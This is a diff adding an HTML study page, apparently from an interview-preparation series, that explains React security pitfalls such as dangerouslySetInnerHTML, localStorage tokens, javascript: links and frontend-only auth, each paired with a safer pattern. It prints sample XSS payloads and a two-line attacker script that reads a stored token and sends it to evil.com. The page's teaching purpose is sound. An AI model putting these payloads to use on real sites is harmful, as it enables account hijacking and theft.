@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>444 - React App Security Concerns</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+body{margin:0;padding:0;background:#000814;color:#e2e8f0;font-family:Arial,sans-serif;line-height:1.7}
+.container{max-width:1000px;margin:40px auto;background:#020617;padding:40px;border-radius:18px;border:1px solid #0f172a;box-shadow:0 0 40px rgba(0,0,0,.95)}
+h1{color:#f8fafc;margin-bottom:30px;font-size:34px}
+h2{color:#c084fc;margin-top:35px;margin-bottom:15px;font-size:26px}
+h3{color:#38bdf8;margin-top:25px;margin-bottom:10px;font-size:21px}
+p,li{color:#cbd5e1}
+ul{padding-left:24px}
+table{width:100%;border-collapse:collapse;margin-top:20px}
+table th,table td{border:1px solid #1e293b;padding:14px;text-align:left;vertical-align:top}
+table th{background:#0f172a;color:#38bdf8}
+table td{background:#020617;color:#d1d5db}
+.highlight{background:#0f172a;padding:18px;border-left:5px solid #38bdf8;border-radius:10px}
+.success{background:#052e16;padding:18px;border-left:5px solid #22c55e;border-radius:10px;margin-top:15px}
+.warning{background:#1e1b4b;padding:18px;border-left:5px solid #fbbf24;border-radius:10px;margin-top:15px}
+.danger{background:#450a0a;padding:18px;border-left:5px solid #ef4444;border-radius:10px;margin-top:15px}
+.flow{background:#020617;border:1px solid #1e293b;padding:20px;border-radius:10px;text-align:center;line-height:2;font-size:18px}
+.file-name{background:#111827;color:#93c5fd;padding:12px 16px;border-radius:10px;border:1px solid #1e293b;font-weight:bold;margin-top:20px;margin-bottom:10px}
+.badge{display:inline-block;background:#111827;color:#fbbf24;border:1px solid #334155;border-radius:999px;padding:4px 10px;font-size:13px;margin-left:8px}
+pre[class*="language-"],code[class*="language-"]{color:#f8f8f2;background:#1e1e1e;font-family:Consolas,Monaco,'Courier New',monospace;font-size:15px}
+.token.keyword{color:#c792ea}.token.string{color:#c3e88d}.token.function{color:#82aaff}.token.class-name{color:#ffcb6b}.token.number{color:#f78c6c}.token.operator{color:#89ddff}.token.punctuation{color:#89ddff}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>444. What Security Concerns Are Specific To React Apps?</h1>
+
+<h2>One-Line Definition</h2>
+<div class="highlight">React is secure by default against many XSS cases, but React apps can still become vulnerable because of unsafe HTML rendering, insecure APIs, exposed secrets, bad token storage, dependency issues, and poor routing or authorization checks.</div>
+
+<h2>Simple Idea</h2>
+<div class="flow">React Protects JSX<br>↓<br>Developer Uses Unsafe Pattern<br>↓<br>Browser Executes Bad Code<br>↓<br>Security Issue Happens</div>
+
+<h2>1. XSS Using dangerouslySetInnerHTML</h2>
+<p>React normally escapes values inside JSX. But <b>dangerouslySetInnerHTML</b> tells React to insert raw HTML directly into the page.</p>
+
+<div class="file-name">Unsafe Example</div>
+<pre class="language-jsx"><code class="language-jsx">function Comment({ comment }) {
+  return &lt;div dangerouslySetInnerHTML={{ __html: comment }} /&gt;;
+}</code></pre>
+
+<div class="danger">If comment comes from user input, an attacker can insert malicious HTML or JavaScript.</div>
+
+<div class="file-name">Attacker Input</div>
+<pre class="language-html"><code class="language-html">&lt;img src="x" onerror="alert('Hacked')" /&gt;</code></pre>
+
+<div class="file-name">Safe Example</div>
+<pre class="language-jsx"><code class="language-jsx">function Comment({ comment }) {
+  return &lt;div&gt;{comment}&lt;/div&gt;;
+}</code></pre>
+
+<div class="success">JSX with curly braces escapes HTML by default, so the script is shown as text instead of being executed.</div>
+
+<h2>2. Storing Tokens In localStorage</h2>
+<p>Many React apps store login tokens in localStorage. This is risky because JavaScript can read localStorage.</p>
+
+<div class="file-name">Risky Token Storage</div>
+<pre class="language-js"><code class="language-js">localStorage.setItem('token', token);</code></pre>
+
+<div class="warning">If XSS happens, attacker JavaScript can read this token and send it outside.</div>
+
+<div class="file-name">Attacker Script</div>
+<pre class="language-js"><code class="language-js">const token = localStorage.getItem('token');
+fetch('https://evil.com/steal?token=' + token);</code></pre>
+
+<div class="success">Better approach: use secure, HttpOnly cookies for sensitive tokens when possible.</div>
+
+<h2>3. Exposing Secrets In Frontend Code</h2>
+<p>React code runs in the browser. Anything inside React frontend code can be seen by users.</p>
+
+<div class="file-name">Bad Example</div>
+<pre class="language-js"><code class="language-js">const API_SECRET = 'my-private-secret-key';</code></pre>
+
+<div class="danger">Never put private API keys, database passwords, or server secrets inside React code.</div>
+
+<div class="success">Keep secrets on the backend. React should call your backend, and backend should call protected services.</div>
+
+<h2>4. Trusting Frontend Route Protection Only</h2>
+<p>React route guards only hide pages in the UI. They do not protect real backend data.</p>
+
+<div class="file-name">Frontend Route Guard</div>
+<pre class="language-jsx"><code class="language-jsx">if (!user) return &lt;Navigate to="/login" /&gt;;
+return &lt;AdminDashboard /&gt;;</code></pre>
+
+<div class="warning">This protects the screen, not the API. A user can still call the API directly from browser tools or Postman.</div>
+
+<div class="file-name">Backend Must Also Check</div>
+<pre class="language-js"><code class="language-js">app.get('/api/admin', verifyToken, verifyAdmin, (req, res) =&gt; {
+  res.json({ data: 'admin data' });
+});</code></pre>
+
+<h2>5. Unsafe User URLs</h2>
+<p>If you render user-provided links, attackers may try dangerous URLs like <b>javascript:</b>.</p>
+
+<div class="file-name">Unsafe Link</div>
+<pre class="language-jsx"><code class="language-jsx">function ProfileLink({ url }) {
+  return &lt;a href={url}&gt;Visit Profile&lt;/a&gt;;
+}</code></pre>
+
+<div class="file-name">Dangerous Input</div>
+<pre class="language-text"><code class="language-text">javascript:alert('Hacked')</code></pre>
+
+<div class="file-name">Safer Check</div>
+<pre class="language-js"><code class="language-js">function isSafeUrl(url) {
+  return url.startsWith('https://') || url.startsWith('http://');
+}</code></pre>
+
+<h2>6. Third-Party Package Vulnerabilities</h2>
+<p>React apps usually depend on many npm packages. A vulnerable package can create security problems.</p>
+
+<div class="file-name">Check Dependencies</div>
+<pre class="language-bash"><code class="language-bash">npm audit</code></pre>
+
+<div class="success">Keep dependencies updated and avoid unknown packages with low trust.</div>
+
+<h2>7. CSRF With Cookie-Based Auth</h2>
+<p>If your React app uses cookies for authentication, browsers automatically send cookies with requests. Attackers may try to trigger unwanted actions from another site.</p>
+
+<div class="file-name">Protection Ideas</div>
+<pre class="language-text"><code class="language-text">Use SameSite cookies
+Use CSRF tokens
+Validate Origin / Referer on backend
+Require proper authentication checks</code></pre>
+
+<h2>8. Insecure API Error Messages</h2>
+<p>Do not expose sensitive backend details in frontend error messages.</p>
+
+<div class="file-name">Bad Error</div>
+<pre class="language-json"><code class="language-json">{
+  "error": "Database password failed for user root"
+}</code></pre>
+
+<div class="file-name">Better Error</div>
+<pre class="language-json"><code class="language-json">{
+  "error": "Something went wrong"
+}</code></pre>
+
+<h2>Common React Security Concerns</h2>
+<table>
+<tr><th>Concern</th><th>Why Dangerous</th><th>Safer Approach</th></tr>
+<tr><td>dangerouslySetInnerHTML</td><td>Can execute malicious HTML/JS</td><td>Avoid it or sanitize HTML first</td></tr>
+<tr><td>localStorage tokens</td><td>XSS can steal tokens</td><td>Use HttpOnly secure cookies when possible</td></tr>
+<tr><td>Frontend-only auth</td><td>Users can bypass UI checks</td><td>Always validate on backend</td></tr>
+<tr><td>Exposed secrets</td><td>Frontend code is visible</td><td>Keep secrets on server</td></tr>
+<tr><td>Unsafe URLs</td><td>javascript: links can execute code</td><td>Validate allowed URL protocols</td></tr>
+<tr><td>Old npm packages</td><td>Known vulnerabilities</td><td>Update and audit dependencies</td></tr>
+</table>
+
+<h2>Best Practices</h2>
+<ul>
+<li>Avoid <b>dangerouslySetInnerHTML</b> unless absolutely required.</li>
+<li>Sanitize HTML before rendering user-generated HTML.</li>
+<li>Never store private secrets in React code.</li>
+<li>Do not depend only on React route guards for security.</li>
+<li>Validate permissions on the backend.</li>
+<li>Be careful with localStorage token storage.</li>
+<li>Keep npm packages updated.</li>
+<li>Validate user-provided URLs.</li>
+</ul>
+
+<h2>Easy Way To Remember</h2>
+<div class="flow">React UI Security<br>↓<br>Escape User Data<br>↓<br>Avoid Raw HTML<br>↓<br>Protect Tokens<br>↓<br>Validate On Backend</div>
+
+<h2>Interview Answer</h2>
+<div class="highlight">React apps can have security concerns such as XSS through dangerouslySetInnerHTML, unsafe token storage in localStorage, exposed frontend secrets, unsafe user-provided URLs, dependency vulnerabilities, CSRF with cookie-based auth, and relying only on frontend route protection. React escapes JSX values by default, but developers must avoid unsafe raw HTML rendering and always validate authorization and sensitive actions on the backend.</div>
+
+<h2>One-Line Interview Answer</h2>
+<div class="highlight">React is safe by default for JSX rendering, but React apps become vulnerable when developers use unsafe HTML, store sensitive data insecurely, expose secrets, or rely only on frontend checks.</div>
+
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-jsx.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+</body>
+</html>
